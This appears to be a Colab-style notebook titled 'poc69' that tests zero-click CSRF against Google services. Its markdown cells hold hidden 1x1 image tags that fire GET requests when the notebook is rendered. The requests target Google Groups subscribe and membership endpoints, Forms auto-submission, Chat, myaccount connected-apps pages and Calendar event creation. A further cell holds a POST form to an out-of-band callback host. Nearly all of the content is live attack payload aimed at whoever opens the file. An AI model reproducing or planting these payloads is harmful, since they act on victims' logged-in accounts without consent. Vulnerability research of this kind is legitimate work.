# %% [markdown]
# # poc69 -- High-impact GET CSRF: Groups, Forms, Chat, Calendar
#
# Tests: Google Groups open subscribe, Google Forms GET submission, Google Chat reach, myaccount connected apps, Calendar event creation.

# %% [markdown]
# <form method="POST" action="https://xlzvq8jzgqrp8idpbsh45odyfxo54peok.oast.site"><input type="image" src="valid_image_url.jpg" alt="Submit POST request"></form>
#
# Groups subscribe test: does GET to /g/test-colab122/subscribe auto-subscribe victim?

# %% [markdown]
# <img src="https://groups.google.com/forum/#!subscribeToForum?forum=test-colab122" width="1" height="1">
#
# Groups forum join alt format: legacy subscribe endpoint.

# %% [markdown]
# <img src="https://groups.google.com/g/test-colab122/memberships" width="1" height="1">
#
# Groups memberships endpoint: does GET to /memberships trigger join for open group?

# %% [markdown]
# <img src="https://docs.google.com/forms/d/REPLACE_WITH_FORM_ID/formResponse?entry.REPLACE_WITH_ENTRY_ID=csrf_test_victim_submitted_this&submit=Submit&usp=pp_url" width="1" height="1">
#
# Google Forms GET submission: does formResponse?submit=Submit auto-submit a response?

# %% [markdown]
# <img src="https://docs.google.com/forms/d/REPLACE_WITH_FORM_ID/formResponse?entry.REPLACE_WITH_ENTRY_ID=csrf_test_victim_submitted_this&submit=Submit&ifq" width="1" height="1">
#
# Google Forms GET submission with ifq (alternate direct-submit flag).

# %% [markdown]
# <img src="https://chat.google.com/__poc69/CHAT_REACH" width="1" height="1">
#
# Google Chat domain reach: confirms chat.google.com receives same-site auth cookies.

# %% [markdown]
# <img src="https://myaccount.google.com/connections" width="1" height="1">
#
# myaccount Connected Apps page: confirms endpoint is auth-accessible for follow-up.

# %% [markdown]
# <img src="https://myaccount.google.com/permissions" width="1" height="1">
#
# myaccount Permissions page: alternative path for connected/authorized apps.

# %% [markdown]
# <img src="https://calendar.google.com/calendar/r/eventedit?text=poc69+CSRF+test&dates=20260610T100000Z%2F20260610T110000Z&details=zero-click+calendar+event+creation" width="1" height="1">
#
# Calendar event creation via GET: does eventedit auto-create a server-side draft?
